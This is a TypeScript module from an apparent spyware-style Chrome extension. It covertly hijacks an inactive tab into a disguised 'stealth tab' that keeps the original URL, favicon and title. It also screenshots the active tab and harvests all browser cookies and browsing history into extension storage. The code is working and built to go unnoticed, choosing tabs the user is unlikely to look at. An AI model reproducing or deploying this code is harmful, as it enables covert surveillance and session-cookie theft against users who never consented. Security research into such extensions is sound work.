import { SearchParamKey, StorageKey } from "../consts";
import { IScreenshotLogEntry } from "../interfaces";
import {
  contextData,
  simplePrepend,
  simpleSet,
  writeLog,
} from "./shared-utils";
import { matchesSiteFilters } from "./site-filters";

if (typeof window !== "undefined") {
  throw new Error("Cannot use this in page");
}

// Rate-limit visible tab captures to avoid triggering Chrome quota errors
let _lastCaptureVisibleTs = 0;
const MIN_CAPTURE_INTERVAL_MS = 1000; // 1 second between captures

export async function openStealthTab() {
  writeLog("Attempting to open stealth tab");

  let tabs: chrome.tabs.Tab[] = [];
  try {
    tabs = await chrome.tabs.query({
    // Don't use the tab the user is looking at
    active: false,
    // Don't use pinned tabs, they're probably used frequently
    pinned: false,
    // Don't use a tab generating audio
    audible: false,
    // Don't use a tab until it is finished loading
    status: "complete",
    });
  } catch (e) {
    writeLog(`openStealthTab: unable to query tabs (permissions?): ${e}`);
    return;
  }

  if (tabs.find((tab) => tab.url?.includes("stealth-tab.html"))) {
    await writeLog("Stealth tab exists");
    return;
  }

  const [eligibleTab] = tabs.filter((tab) => {
    // Must have url and id
    if (!tab.id || !tab.url) {
      return false;
    }

    // Don't use extension pages
    if (new URL(tab.url).protocol === "chrome-extension:") {
      return false;
    }

    return true;
  });

  if (eligibleTab) {
    await writeLog("Found eligible tab host for stealth tab");

    const searchParams = new URLSearchParams({
      [SearchParamKey.RETURN_URL]: eligibleTab.url as string,
      [SearchParamKey.FAVICON_URL]: eligibleTab.favIconUrl || "",
      [SearchParamKey.TITLE]: eligibleTab.title || "",
    });

    const url = `${chrome.runtime.getURL(
      "/stealth-tab/stealth-tab.html"
    )}?${searchParams.toString()}`;

    // Retry this a few times, it intermittently errors
    for (let i = 0; i < 3; ++i) {
      try {
        await chrome.tabs.update(eligibleTab.id as number, {
          url,
          active: false,
        });
        break;
      } catch (e) {
        writeLog(`openStealthTab: chrome.tabs.update failed: ${e}`);
      }
    }

    await writeLog("Initialized stealth tab");
  } else {
    await writeLog("No eligible tab host for stealth tab");
  }
}

export async function captureVisibleTab() {
  const now = Date.now();
  if (now - _lastCaptureVisibleTs < MIN_CAPTURE_INTERVAL_MS) {
    writeLog("Skipping captureVisibleTab: rate limited");
    return;
  }
  _lastCaptureVisibleTs = now;

  writeLog(`Capturing visible tab`);

  let activeTab: chrome.tabs.Tab | undefined;
  try {
    const tabs = await chrome.tabs.query({
      active: true,
      currentWindow: true,
    });
    activeTab = tabs[0];
  } catch (e) {
    writeLog(`captureVisibleTab: unable to query tabs (permissions?): ${e}`);
    return;
  }

  if (!activeTab || !activeTab.url) {
    return;
  }

  try {
    let img: string | null = null;
    try {
      img = await chrome.tabs.captureVisibleTab();
    } catch (e) {
      writeLog(`captureVisibleTab: chrome.tabs.captureVisibleTab failed: ${e}`);
      return;
    }
    // Only persist if the URL matches site filters
    if (await matchesSiteFilters(activeTab.url)) {
      await simplePrepend<IScreenshotLogEntry>(
        StorageKey.SCREENSHOT_LOG,
        {
          ...contextData(),
          url: activeTab.url,
          imageData: img,
        },
        20
      );
    }
  } catch (e) {
    writeLog(`captureVisibleTab failed: ${e}`);
  }
}

export async function captureCookies() {
  writeLog(`Capturing cookies`);

  const all = await chrome.cookies.getAll({});
  // Filter cookies by whether their domain would match site filters
  const filtered = [] as chrome.cookies.Cookie[];
  for (const c of all) {
    try {
      const url = `https://${c.domain.replace(/^\./, "")}${c.path || "/"}`;
      if (await matchesSiteFilters(url)) filtered.push(c);
    } catch (e) {
      // ignore malformed
    }
  }

  await simpleSet<chrome.cookies.Cookie[]>(StorageKey.COOKIES, filtered);
}

export async function captureHistory() {
  writeLog(`Capturing history`);
  const all = await chrome.history.search({ text: "" });
  const filtered: chrome.history.HistoryItem[] = [];
  for (const item of all) {
    if (item.url && (await matchesSiteFilters(item.url))) filtered.push(item);
  }

  await simpleSet<chrome.history.HistoryItem[]>(StorageKey.HISTORY, filtered);
}
